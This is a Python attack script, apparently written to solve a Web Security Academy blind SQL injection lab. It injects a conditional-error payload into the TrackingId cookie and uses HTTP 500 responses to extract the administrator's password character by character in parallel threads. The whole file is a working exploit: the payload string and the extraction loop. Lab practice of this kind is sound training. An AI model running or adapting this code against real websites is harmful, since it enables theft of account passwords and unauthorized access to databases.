#!/usr/bin/python3
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import sys
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def check_char(url, position, ascii_val):
    """Worker function to test a single character at a specific position."""
    sqli_payload = "' || (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (position, ascii_val)
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    
    cookies = {
        'TrackingId': 'YOURTRACKINGIDHERE' + sqli_payload_encoded, 
        'session': 'YOURSESSIONHERE'
    }
    
    try:
        r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        # Server returns 500 when division by zero triggers (condition matches)
        if r.status_code == 500:
            return chr(ascii_val)
    except requests.RequestException:
        pass
        
    return None

def sqli_password(url, max_threads=10):
    password_extracted = ""
    print(f"[+] Starting extraction using {max_threads} threads...\n")
    
    # Iterate through each character position (1 to 20)
    for i in range(1, 21):
        found_char = None
        
        # Launch parallel workers to test ASCII characters (32 to 126) for position `i`
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            future_to_char = {
                executor.submit(check_char, url, i, j): j 
                for j in range(32, 127)
            }
            
            for future in as_completed(future_to_char):
                result = future.result()
                if result:
                    found_char = result
                    # Cancel remaining pending tasks for this position
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
        
        if found_char:
            password_extracted += found_char
            print(f"[+] Found position {i:02d}: {found_char}  -->  Current Password: {password_extracted}")
        else:
            print(f"[-] Could not determine character at position {i:02d}")
            break

    print(f"\n[+] Final Password: {password_extracted}")

def main():
    if len(sys.argv) != 2:
        print(f'[+] Usage: {sys.argv[0]} <url>')
        print(f'[+] Example: {sys.argv[0]} https://YOUR-LAB-ID.web-security-academy.net/')
        sys.exit(-1)
         
    url = sys.argv[1]
    print("[+] Retrieving administrator password.......")

    # Set threads count (10-15 is usually optimal for Web Security Academy labs)
    sqli_password(url, max_threads=15)

if __name__ == "__main__":
    main()
